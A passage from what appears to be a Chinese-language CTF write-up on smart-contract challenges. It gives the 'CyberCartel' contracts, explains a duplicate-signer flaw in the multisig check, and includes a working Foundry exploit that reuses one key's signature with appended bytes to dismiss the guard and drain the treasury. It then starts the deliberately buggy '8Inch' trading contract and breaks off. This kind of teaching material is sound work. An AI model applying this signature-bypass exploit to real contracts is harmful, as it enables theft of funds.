class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line">contract Challenge {</span><br><span class="line">    address public immutable TREASURY;</span><br><span class="line"></span><br><span class="line">    constructor(address treasury) {</span><br><span class="line">        TREASURY = treasury;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function isSolved() external view returns (bool) {</span><br><span class="line">        return address(TREASURY).balance == 0;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line">contract CartelTreasury {</span><br><span class="line">    uint256 public constant MIN_TIME_BETWEEN_SALARY = 1 minutes;</span><br><span class="line"></span><br><span class="line">    address public bodyGuard;</span><br><span class="line">    mapping(address =&gt; uint256) public lastTimeSalaryPaid;</span><br><span class="line"></span><br><span class="line">    function initialize(address bodyGuard_) external {</span><br><span class="line">        require(bodyGuard == address(0), "Already initialized");</span><br><span class="line">        bodyGuard = bodyGuard_;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    modifier guarded() {</span><br><span class="line">        require(bodyGuard == address(0) || bodyGuard == msg.sender, "Who?");</span><br><span class="line">        _;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function doom() external guarded {</span><br><span class="line">        payable(msg.sender).transfer(address(this).balance);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    /// Dismiss the bodyguard</span><br><span class="line">    function gistCartelDismiss() external guarded {</span><br><span class="line">        bodyGuard = address(0);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    /// Payout the salary to the caller every 1 minute</span><br><span class="line">    function salary() external {</span><br><span class="line">        require(block.timestamp - lastTimeSalaryPaid[msg.sender] &gt;= MIN_TIME_BETWEEN_SALARY, "Too soon");</span><br><span class="line">        lastTimeSalaryPaid[msg.sender] = block.timestamp;</span><br><span class="line">        payable(msg.sender).transfer(0.0001 ether);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    receive() external payable {}</span><br><span class="line">}</span><br><span class="line">contract BodyGuard {</span><br><span class="line">    bytes public constant DIGEST_SEED = hex"80840397b652018080";</span><br><span class="line">    address public treasury;</span><br><span class="line">    uint8 lastNonce = 0;</span><br><span class="line">    uint8 minVotes = 0;</span><br><span class="line">    mapping(address =&gt; bool) public guardians;</span><br><span class="line"></span><br><span class="line">    struct Proposal {</span><br><span class="line">        uint32 expiredAt;</span><br><span class="line">        uint24 gas;</span><br><span class="line">        uint8 nonce;</span><br><span class="line">        bytes data;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    constructor(address treasury_, address[] memory guardians_) {</span><br><span class="line">        require(treasury == address(0), "Already initialized");</span><br><span class="line">        treasury = treasury_;</span><br><span class="line">        for (uint256 i = 0; i &lt; guardians_.length; i++) {</span><br><span class="line">            guardians[guardians_[i]] = true;</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        minVotes = uint8(guardians_.length);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function propose(Proposal memory proposal, bytes[] memory signatures) external {</span><br><span class="line">        require(proposal.expiredAt &gt; block.timestamp, "Expired");</span><br><span class="line">        require(proposal.nonce &gt; lastNonce, "Invalid nonce");</span><br><span class="line"></span><br><span class="line">        uint256 minVotes_ = minVotes;</span><br><span class="line">        if (guardians[msg.sender]) {</span><br><span class="line">            minVotes_--;</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        require(minVotes_ &lt;= signatures.length, "Not enough signatures");</span><br><span class="line">        require(validateSignatures(hashProposal(proposal), signatures), "Invalid signatures");</span><br><span class="line"></span><br><span class="line">        lastNonce = proposal.nonce;</span><br><span class="line"></span><br><span class="line">        uint256 gasToUse = proposal.gas;</span><br><span class="line">        if (gasleft() &lt; gasToUse) {</span><br><span class="line">            gasToUse = gasleft();</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        (bool success,) = treasury.call{gas: gasToUse * 9 / 10}(proposal.data);</span><br><span class="line">        if (!success) {</span><br><span class="line">            revert("Execution failed");</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function hashProposal(Proposal memory proposal) public view returns (bytes32) {</span><br><span class="line">        return keccak256(</span><br><span class="line">            abi.encodePacked(proposal.expiredAt, proposal.gas, proposal.data, proposal.nonce, treasury, DIGEST_SEED)</span><br><span class="line">        );</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function validateSignatures(bytes32 digest, bytes[] memory signaturesSortedBySigners) public view returns (bool) {</span><br><span class="line">        bytes32 lastSignHash = bytes32(0); // ensure that the signers are not duplicated</span><br><span class="line"></span><br><span class="line">        for (uint256 i = 0; i &lt; signaturesSortedBySigners.length; i++) {</span><br><span class="line">            address signer = recoverSigner(digest, signaturesSortedBySigners[i]);</span><br><span class="line">            require(guardians[signer], "Not a guardian");</span><br><span class="line"></span><br><span class="line">            bytes32 signHash = keccak256(signaturesSortedBySigners[i]);</span><br><span class="line">            if (signHash &lt;= lastSignHash) {</span><br><span class="line">                return false;</span><br><span class="line">            }</span><br><span class="line"></span><br><span class="line">            lastSignHash = signHash;</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        return true;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function recoverSigner(bytes32 digest, bytes memory signature) public pure returns (address) {</span><br><span class="line">        bytes32 r;</span><br><span class="line">        bytes32 s;</span><br><span class="line">        uint8 v;</span><br><span class="line">        assembly {</span><br><span class="line">            r := mload(add(signature, 32))</span><br><span class="line">            s := mload(add(signature, 64))</span><br><span class="line">            v := byte(0, mload(add(signature, 96)))</span><br><span class="line">        }</span><br><span class="line">        return ecrecover(digest, v, r, s);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div><h4 id="題解-2"><a href="#題解-2" class="headerlink" title="題解"></a>題解</h4><p>在 <code>BodyGuard::validateSignatures</code> 中，沒有檢查好有無同個人重複簽名。可以在同個人的簽名 encodePacked 的內容後面塞一些垃圾，合約就會以為是不同人簽的，但 ecrecover 解出來的仍然是正確的。如下。</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">bytes[] memory signaturesSortedBySigners = new bytes[](2);</span><br><span class="line"></span><br><span class="line">uint8 v; bytes32 r; bytes32 s;</span><br><span class="line">(v, r, s) = vm.sign(playerPrivateKey, proposalHash);</span><br><span class="line">signaturesSortedBySigners[0] = abi.encodePacked(r, s, v);</span><br><span class="line"></span><br><span class="line">(v, r, s) = vm.sign(playerPrivateKey, proposalHash);</span><br><span class="line">signaturesSortedBySigners[1] = abi.encodePacked(r, s, v, address(0x1));</span><br><span class="line"></span><br><span class="line">guard.propose(proposal, signaturesSortedBySigners);</span><br></pre></td></tr></table></figure></div><h4 id="解題環境細節-1"><a href="#解題環境細節-1" class="headerlink" title="解題環境細節"></a>解題環境細節</h4><p>在解題過程需要測試，這邊拿 <a class="link" href="https://damnvulnerabledefi.xyz/">Damn Vulnerable DeFi <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 的 test script 來改，測試起來蠻方便的。</p><h6 id="test-Solve-t-sol"><a href="#test-Solve-t-sol" class="headerlink" title="test/Solve.t.sol"></a>test/Solve.t.sol</h6><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)</span><br><span class="line">pragma solidity =0.8.25;</span><br><span class="line"></span><br><span class="line">import {Test, console} from "forge-std/Test.sol";</span><br><span class="line">import "forge-ctf/CTFDeployer.sol";</span><br><span class="line">import "src/CyberCartel.sol";</span><br><span class="line">import "src/Challenge.sol";</span><br><span class="line"></span><br><span class="line">contract CyberCartelChallenge is Test {</span><br><span class="line">    uint256 playerPrivateKey = uint256(keccak256("player"));</span><br><span class="line">    address player = vm.addr(playerPrivateKey);</span><br><span class="line"></span><br><span class="line">    Challenge challenge;</span><br><span class="line"></span><br><span class="line">    modifier checkSolvedByPlayer() {</span><br><span class="line">        vm.startPrank(player, player);</span><br><span class="line">        _;</span><br><span class="line">        vm.stopPrank();</span><br><span class="line">        _isSolved();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * SETS UP CHALLENGE - DO NOT TOUCH</span><br><span class="line">     */</span><br><span class="line">    function setUp() public {</span><br><span class="line">        // startHoax(deployer);</span><br><span class="line">        address system = makeAddr("system");</span><br><span class="line">        uint256 privateKey = uint256(keccak256("CyberCartel"));</span><br><span class="line">        address deployer = vm.addr(privateKey);</span><br><span class="line"></span><br><span class="line">        CartelTreasury cartel;</span><br><span class="line">        vm.deal(system, 1000 ether);</span><br><span class="line"></span><br><span class="line">        {</span><br><span class="line">            vm.startBroadcast(system);</span><br><span class="line">            t(deployer, 888 ether);</span><br><span class="line">            vm.stopBroadcast();</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        {</span><br><span class="line">            vm.startBroadcast(privateKey);</span><br><span class="line"></span><br><span class="line">            address guardian1 = 0xA66bA931da982b11a2f3b89d1D732537EA4bc30D;</span><br><span class="line">            address guardian2 = 0xa66ba931dA982b11A2F3B89d1d732537ea4bC30E;</span><br><span class="line">            address guardian3 = player;</span><br><span class="line"></span><br><span class="line">            t(guardian1, 10 ether);</span><br><span class="line">            t(guardian2, 10 ether);</span><br><span class="line">            t(guardian3, 10 ether);</span><br><span class="line"></span><br><span class="line">            cartel = new CartelTreasury();</span><br><span class="line">            address[] memory guardians = new address[](3);</span><br><span class="line">            guardians[0] = 0xA66bA931da982b11a2f3b89d1D732537EA4bc30D;</span><br><span class="line">            guardians[1] = 0xa66ba931dA982b11A2F3B89d1d732537ea4bC30E;</span><br><span class="line">            guardians[2] = player;</span><br><span class="line">            address bodyguard = address(new BodyGuard(address(cartel), guardians));</span><br><span class="line"></span><br><span class="line">            cartel.initialize(bodyguard);</span><br><span class="line">            t(address(cartel), 777 ether);</span><br><span class="line"></span><br><span class="line">            vm.stopBroadcast();</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        vm.startBroadcast(system);</span><br><span class="line">        challenge = new Challenge(address(cartel));</span><br><span class="line">        vm.stopBroadcast();    </span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function t(address r, uint256 v) internal {</span><br><span class="line">        (bool success,) = r.call{value: v}("");</span><br><span class="line">        require(success, "Failed to send ETH");</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * CODE YOUR SOLUTION HERE</span><br><span class="line">     */</span><br><span class="line">    function test_solve() public checkSolvedByPlayer {</span><br><span class="line">        CartelTreasury cartel = CartelTreasury(payable(challenge.TREASURY()));</span><br><span class="line">        BodyGuard guard = BodyGuard(cartel.bodyGuard());</span><br><span class="line"></span><br><span class="line">        BodyGuard.Proposal memory proposal = BodyGuard.Proposal({</span><br><span class="line">            expiredAt: uint32(block.timestamp + 1 days),</span><br><span class="line">            gas: 100000,</span><br><span class="line">            data: abi.encodeWithSignature("gistCartelDismiss()"),</span><br><span class="line">            nonce: 1</span><br><span class="line">        });</span><br><span class="line"></span><br><span class="line">        bytes32 proposalHash = guard.hashProposal(proposal);</span><br><span class="line">        bytes[] memory signaturesSortedBySigners = new bytes[](2);</span><br><span class="line"></span><br><span class="line">        uint8 v; bytes32 r; bytes32 s;</span><br><span class="line">        (v, r, s) = vm.sign(playerPrivateKey, proposalHash);</span><br><span class="line">        signaturesSortedBySigners[0] = abi.encodePacked(r, s, v);</span><br><span class="line"></span><br><span class="line">        (v, r, s) = vm.sign(playerPrivateKey, proposalHash);</span><br><span class="line">        signaturesSortedBySigners[1] = abi.encodePacked(r, s, v, address(0x1));</span><br><span class="line"></span><br><span class="line">        guard.propose(proposal, signaturesSortedBySigners);</span><br><span class="line"></span><br><span class="line">        cartel.doom();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH</span><br><span class="line">     */</span><br><span class="line">    function _isSolved() private view {</span><br><span class="line">        require(challenge.isSolved() == true, "Challenge not solved");</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">forge <span class="built_in">test</span> -vvvv</span><br></pre></td></tr></table></figure></div><hr><p>分隔線上是賽中解的，這次有一堆題目都差一點就解的。感覺蠻適合進步用。整體難度應該算對我學習蠻優良的。</p><h3 id="8Inch"><a href="#8Inch" class="headerlink" title="8Inch"></a>8Inch</h3><h4 id="題目-3"><a href="#題目-3" class="headerlink" title="題目"></a>題目</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import "./ERC20.sol";</span><br><span class="line">import "./SafeUint112.sol";</span><br><span class="line">import "forge-std/console.sol";</span><br><span class="line"></span><br><span class="line">contract TradeSettlement is SafeUint112 {</span><br><span class="line">    struct Trade {</span><br><span class="line">        address maker;</span><br><span class="line">        address taker;</span><br><span class="line">        address tokenToSell;</span><br><span class="line">        address tokenToBuy;</span><br><span class="line">        uint112 amountToSell;</span><br><span class="line">        uint112 amountToBuy;</span><br><span class="line">        uint112 filledAmountToSell;</span><br><span class="line">        uint112 filledAmountToBuy;</span><br><span class="line">        bool isActive;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    mapping(uint256 =&gt; Trade) public trades;</span><br><span class="line">    uint256 public nextTradeId;</span><br><span class="line">    bool private locked;</span><br><span class="line">    uint256 public fee = 30 wei;</span><br><span class="line"></span><br><span class="line">    event TradeCreated(uint256 indexed tradeId, address indexed maker, address tokenToSell, address tokenToBuy, uint256 amountToSell, uint256 amountToBuy);</span><br><span class="line">    event TradeSettled(uint256 indexed tradeId, address indexed settler, uint256 settledAmountToSell);</span><br><span class="line">    event TradeCancelled(uint256 indexed tradeId);</span><br><span class="line"></span><br><span class="line">    modifier nonReentrant() {</span><br><span class="line">        require(!locked, "ReentrancyGuard: reentrant call");</span><br><span class="line">        locked = true;</span><br><span class="line">        _;</span><br><span class="line">        locked = false;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function createTrade(</span><br><span class="line">        address _tokenToSell,</span><br><span class="line">        address _tokenToBuy,</span><br><span class="line">        uint256 _amountToSell,</span><br><span class="line">        uint256 _amountToBuy</span><br><span class="line">    ) external nonReentrant {</span><br><span class="line">        require(_tokenToSell != address(0) &amp;&amp; _tokenToBuy != address(0), "Invalid token addresses");</span><br><span class="line"></span><br><span class="line">        uint256 tradeId = nextTradeId++;</span><br><span class="line">        trades[tradeId] = Trade({</span><br><span class="line">            maker: msg.sender,</span><br><span class="line">            taker: address(0),</span><br><span class="line">            tokenToSell: _tokenToSell,</span><br><span class="line">            tokenToBuy: _tokenToBuy,</span><br><span class="line">            amountToSell: safeCast(_amountToSell - fee),</span><br><span class="line">            amountToBuy: safeCast(_amountToBuy),</span><br><span class="line">            filledAmountToSell: 0,</span><br><span class="line">            filledAmountToBuy: 0,</span><br><span class="line">            isActive: true</span><br><span class="line">        });</span><br><span class="line"></span><br><span class="line">        require(IERC20(_tokenToSell).transferFrom(msg.sender, address(this), _amountToSell), "Transfer failed");</span><br><span class="line"></span><br><span class="line">        emit TradeCreated(tradeId, msg.sender, _tokenToSell, _tokenToBuy, _amountToSell, _amountToBuy);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function scaleTrade(uint256 _tradeId, uint256 scale) external nonReentrant {</span><br><span class="line">        require(msg.sender == trades[_tradeId].maker, "Only maker can scale");</span><br><span class="line">        Trade storage trade = trades[_tradeId];</span><br><span class="line">        require(trade.isActive, "Trade is not active");</span><br><span class="line">        require(scale &gt; 0, "Invalid scale");</span><br><span class="line">        require(trade.filledAmountToBuy == 0, "Trade is already filled");</span><br><span class="line">        uint112 originalAmountToSell = trade.amountToSell;</span><br><span class="line">        trade.amountToSell = safeCast(safeMul(trade.amountToSell, scale));</span><br><span class="line">        trade.amountToBuy = safeCast(safeMul(trade.amountToBuy, scale));</span><br><span class="line">        uint256 newAmountNeededWithFee = safeCast(safeMul(originalAmountToSell, scale) + fee);</span><br><span class="line">        if (originalAmountToSell &lt; newAmountNeededWithFee) {</span><br><span class="line">            require(</span><br><span class="line">                IERC20(trade.tokenToSell).transferFrom(msg.sender, address(this), newAmountNeededWithFee - originalAmountToSell),</span><br><span class="line">                "Transfer failed"</span><br><span class="line">            );</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function settleTrade(uint256 _tradeId, uint256 _amountToSettle) external nonReentrant {</span><br><span class="line">        Trade storage trade = trades[_tradeId];</span><br><span class="line">        require(trade.isActive, "Trade is not active");</span><br><span class="line">        require(_amountToSettle &gt; 0, "Invalid settlement amount");</span><br><span class="line">        uint256 tradeAmount = _amountToSettle * trade.amountToBuy;</span><br><span class="line"></span><br><span class="line">        require(trade.filledAmountToSell + _amountToSettle &lt;= trade.amountToSell, "Exceeds available amount");</span><br><span class="line"></span><br><span class="line">        require(IERC20(trade.tokenToBuy).transferFrom(msg.sender, trade.maker, tradeAmount / trade.amountToSell), "Buy transfer failed");</span><br><span class="line">        require(IERC20(trade.tokenToSell).transfer(msg.sender, _amountToSettle), "Sell transfer failed");</span><br><span class="line"></span><br><span class="line">        trade.filledAmountToSell += safeCast(_amountToSettle);</span><br><span class="line">        trade.filledAmountToBuy += safeCast(tradeAmount / trade.amountToSell);</span><br><span class="line"></span><br><span class="line">        if (trade.filledAmountToSell &gt; trade.amountToSell) {</span><br><span class="line">            trade.isActive = false;</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        emit TradeSettled(_tradeId, msg.sender, _amountToSettle);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function cancelTrade(uint256 _tradeId) external nonReentrant {</span><br><span class="line">        Trade storage trade = trades[_tradeId];</span><br><span class="line">        require(msg.sender == trade.maker, "Only maker can cancel");</span><br><span class="line">        require(trade.isActive, "Trade is not active");</span><br><span class="line"></span><br><span class="line">        uint256 remainingAmount = trade.amountToSell - trade.filledAmountToSell;</span><br><span class="line">        if (remainingAmount &gt; 0) {</span><br><span class="line">            require(IERC20(trade.tokenToSell).transfer(trade.maker, remainingAmount), "Transfer failed");</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        trade.isActive = false;</span><br><span class="line"></span><br><span class="line">        emit TradeCancelled(_tradeId);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function getTrade(uint256 _tradeId) external view returns (</span><br><span class="line">        address maker,</span><br><span class="line">        address taker,</span><br><span class="line">        address tokenToSell,</span><br><span class="line">        address tokenToBuy,</span><br><span class="line">        uint256 amountToSell,</span><br><span class="line">        uint256 amountToBuy,</span><br><span class="line">        uint256 filledAmountToSell,</span><br><span class="line">        uint256 filledAmountToBuy,</span><br><span class="line">        bool isActive</span><br><span class="line">    ) {</span><br><span class="line">        Trade storage trade = trades[_tradeId];</span><br><span class="line">        return (</span><br><span class="line">            trade.maker,</span><br><span class="line">            trade.taker,</span><br><span class="line">            trade.tokenToSell,</span><br><span class="line">            trade.tokenToBuy,</span><br><span class="line">            trade.amountToSell,</span><br><span class="line">            trade.amountToBuy,</span><br><span class="line">            trade.filledAmountToSell,</span><br><span class="line">            trade.filledAmountToBuy,</span><br><span class="line">            trade.isActive</span><br><span class="line">        );</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">contract Challenge {</span><br><span class="line">    TradeSettlement public tradeSettlement;</span><br><span class="line">    SimpleERC20 public wojak;</span><br><span class="line">    SimpleERC20 public weth;</span><br><span class="line"></span><br><span class="line">    constructor() {</span><br><span class="line">        tradeSettlement = new TradeSettlement();</span><br><span class="line"></span><br><span class="line">        weth = new SimpleERC20("Wrapped Ether", "WETH", 18, 10 ether);</span><br><span class="line">        wojak = new SimpleERC20("Wojak", "WOJAK", 18, 10 ether);</span><br><span class="line"></span><br><span class="line">        wojak.approve(address(tradeSettlement), 10 ether);</span><br><span class="line"></span><br><span class="line">        // Sell 10 WOJAK for 1 weth</span><br><span class="line">        tradeSettlement.createTrade(address(wojak), address(weth), 10 ether, 1 ether);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function isSolved() public view returns (bool) {</span><br><span class="line">        return wojak.balanceOf(address(0xc0ffee)) &gt;= 10 ether;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div><h6 id="SafeUint112-sol"><a href="#SafeUint112-sol" class="headerlink" title="SafeUint112.sol"></a>SafeUint112.sol</h6><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span 